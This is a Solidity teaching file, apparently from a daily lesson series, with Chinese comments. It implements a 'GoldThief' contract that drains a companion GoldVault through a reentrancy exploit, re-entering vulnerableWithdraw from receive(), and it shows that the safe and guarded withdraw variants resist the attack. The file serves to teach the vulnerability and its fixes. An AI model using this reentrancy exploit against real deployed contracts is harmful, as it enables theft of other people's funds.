// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Day20-GoldVault.sol";

// 攻击合约：利用重入漏洞，从金库中盗取超出自己余额的 ETH
contract GoldThief {
    GoldVault public vault;        // 目标金库合约
    uint256 public attackCount;    // 记录攻击步数（重入次数）
    uint256 public maxAttacks = 5; // 最多攻击次数，防止无限递归
    address public owner;          // 合约所有者（攻击者）
    
    event AttackStarted(uint256 initialDeposit);
    event AttackStep(uint256 step, uint256 withdrawn);
    event AttackCompleted(uint256 totalStolen);
    
    constructor(address _vault) {
        vault = GoldVault(_vault);
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    // 发起攻击：先存款，然后调用 vulnerableWithdraw 触发重入
    function attack() external payable onlyOwner {
        require(msg.value > 0, "Need ETH to start attack");
        
        // 1. 先存款，使金库记录攻击者的余额
        vault.deposit{value: msg.value}();
        
        emit AttackStarted(msg.value);
        
        // 2. 重置攻击计数
        attackCount = 0;
        
        // 3. 调用漏洞函数 vulnerableWithdraw
        //    金库会转账给本合约，触发 receive()，在 receive() 中再次调用 vulnerableWithdraw
        vault.vulnerableWithdraw();
        
        emit AttackCompleted(address(this).balance);
    }
    
    // 尝试攻击安全函数（safeWithdraw）—— 会失败，因为安全函数先更新状态
    function attemptSafeAttack() external payable onlyOwner {
        require(msg.value > 0, "Need ETH to start attack");
        
        vault.deposit{value: msg.value}();
        attackCount = 0;
        
        // 调用安全函数，不会触发重入
        vault.safeWithdraw();
    }
    
    // 尝试攻击有守卫的函数（guardedWithdraw）—— 会被重入锁阻止
    function attemptGuardedAttack() external payable onlyOwner {
        require(msg.value > 0, "Need ETH to start attack");
        
        vault.deposit{value: msg.value}();
        attackCount = 0;
        
        vault.guardedWithdraw();
    }
    
    // 当本合约收到 ETH 时触发（来自金库的转账）
    receive() external payable {
        // 如果还未达到最大攻击次数，并且金库还有余额，则继续重入
        if (attackCount < maxAttacks && address(vault).balance > 0) {
            attackCount++;
            emit AttackStep(attackCount, msg.value);
            
            // 再次调用漏洞函数，实现重入攻击
            vault.vulnerableWithdraw();
        }
    }
    
    // 提取盗取的资金（仅所有者）
    function withdraw() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
    
    // 获取攻击合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
